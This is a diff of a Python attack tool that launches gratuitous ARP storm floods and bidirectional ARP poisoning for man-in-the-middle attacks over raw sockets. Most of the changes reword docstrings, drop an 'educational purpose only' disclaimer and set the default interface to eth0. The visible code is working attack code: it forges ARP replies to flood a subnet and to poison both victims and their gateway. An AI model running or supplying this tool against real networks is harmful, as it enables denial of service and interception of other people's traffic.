@@ -1,13 +1,6 @@
 #!/usr/bin/env python3
 """
-ARP DoS via Gratuitous ARP Storm Attack Tool
-Educational/Research Purpose Only
-
-This tool implements a Gratuitous ARP Storm attack that can cause DoS conditions
-by flooding the network with fake ARP packets, overwhelming network devices.
-
-Author: Security Research Tool
-Date: 2025
+ARP DoS via Gratuitous ARP Storm Attack Research Tool
 """
 
 import socket
@@ -19,19 +12,20 @@ import argparse
 import sys
 from typing import List, Tuple
 
+
 class EthernetFrame:
-    """Ethernet Frame Structure"""
+    """Ethernet frame header, instance represents an Ethernet frame header"""
     def __init__(self, dst_mac: bytes, src_mac: bytes, ethertype: int = 0x0806):
         self.dst_mac = dst_mac      # 6 bytes
         self.src_mac = src_mac      # 6 bytes  
         self.ethertype = ethertype  # 2 bytes (0x0806 for ARP)
     
     def pack(self) -> bytes:
-        """Pack ethernet header into bytes"""
+        """This method serializes the header for packet transmission"""
         return struct.pack("!6s6sH", self.dst_mac, self.src_mac, self.ethertype)
 
 class ARPPacket:
-    """ARP Packet Structure"""
+    """Represents an ARP payload, It customizes all ARP fields"""
     def __init__(self, 
                  htype: int = 1,        # Hardware type (Ethernet = 1)
                  ptype: int = 0x0800,   # Protocol type (IPv4 = 0x0800)
@@ -53,15 +47,16 @@ class ARPPacket:
         self.tpa = tpa
     
     def pack(self) -> bytes:
-        """Pack ARP packet into bytes"""
+        """Pack outputs a binary ARP message ready for transmission"""
         return struct.pack("!HHBBH6s4s6s4s",
                           self.htype, self.ptype, self.hlen, self.plen,
                           self.operation, self.sha, self.spa, self.tha, self.tpa)
 
 class ARPStormAttacker:
-    """Main ARP Storm Attack Class"""
+    """This is the main Engine of the attacker, it handles ARP storm and poisoning attacks"""
     
-    def __init__(self, interface: str = None):
+    def __init__(self, interface: str = "eth0"):
+        # Default to 'eth0' for Docker containers
         self.interface = interface
         self.running = False
         self.threads = []
@@ -85,7 +80,7 @@ class ARPStormAttacker:
         return self.ip_to_bytes(f"{subnet}.{random.randint(1, 254)}")
     
     def create_gratuitous_arp(self, sender_ip: bytes, sender_mac: bytes) -> bytes:
-        """Create a gratuitous ARP packet"""
+        """Create a gratuitous ARP packet, Means it constructs a gratuitous ARP reply, sender claims that he owns the IP address"""
         # Gratuitous ARP: sender announces its own IP-MAC mapping
         arp = ARPPacket(
             operation=2,        # ARP Reply
@@ -98,7 +93,7 @@ class ARPStormAttacker:
     
     def create_poisoning_arp(self, target_ip: bytes, fake_mac: bytes, 
                            victim_ip: bytes) -> bytes:
-        """Create ARP poisoning packet"""
+        """Constructs an ARP reply faking the mapping to poison attack"""
         arp = ARPPacket(
             operation=2,        # ARP Reply
             sha=fake_mac,       # Fake MAC
@@ -111,7 +106,7 @@ class ARPStormAttacker:
     def create_ethernet_frame(self, arp_payload: bytes, 
                             src_mac: bytes = None, 
                             dst_mac: bytes = b'\xff\xff\xff\xff\xff\xff') -> bytes:
-        """Create complete ethernet frame with ARP payload"""
+        """Create complete ethernet frame with ARP payload, it wraps an ARP payload in an Ethernet frame ready to send"""
         if src_mac is None:
             src_mac = self.random_mac()
         
@@ -119,7 +114,10 @@ class ARPStormAttacker:
         return eth_frame.pack() + arp_payload
     
     def storm_worker(self, target_subnet: str, duration: int, packets_per_second: int):
-        """Worker thread for ARP storm"""
+        """Worker thread for ARP storm
+        creates (optionally bound to interface) raw socket
+        Selects random MAC and IP for every packet, simulating a storm
+        Serializes a gratuitous ARP into an ethernet frame and sends over to raw socket"""
         try:
             # Create raw socket
             sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
@@ -163,7 +161,9 @@ class ARPStormAttacker:
             print(f"[!] Error creating socket: {e}")
     
     def poison_worker(self, target_ips: List[str], gateway_ip: str, duration: int):
-        """Worker thread for targeted ARP poisoning"""
+        """Worker thread for targeted ARP poisoning
+        Iterates over each victim, forges ARP replies to poison both victim and gateway
+        Sends ARP reply frames for bi directional MITM posisoning"""
         try:
             sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
             if self.interface:
@@ -216,7 +216,12 @@ class ARPStormAttacker:
                           duration: int = 60, 
                           num_threads: int = 4, 
                           packets_per_second: int = 100):
-        """Start gratuitous ARP storm attack"""
+        """Start gratuitous ARP storm attack
+        prints the attack parameters
+        Starts storm worker threads according to user parameters
+        Prints stats every 5 minutes
+        Handles keyboard interrupt"""
+
         print(f"[*] Starting ARP Storm Attack")
         print(f"[*] Target Subnet: {target_subnet}.0/24")
         print(f"[*] Duration: {duration} seconds")
@@ -255,7 +260,9 @@ class ARPStormAttacker:
     
     def start_poison_attack(self, target_ips: List[str], gateway_ip: str, 
                            duration: int = 60):
-        """Start targeted ARP poisoning attack"""
+        """Start targeted ARP poisoning attack
+        Same as start_storm_attack, but only starts one poison_worker thread
+        Prints peridics stats """
         print(f"[*] Starting ARP Poisoning Attack")
         print(f"[*] Targets: {target_ips}")
         print(f"[*] Gateway: {gateway_ip}")
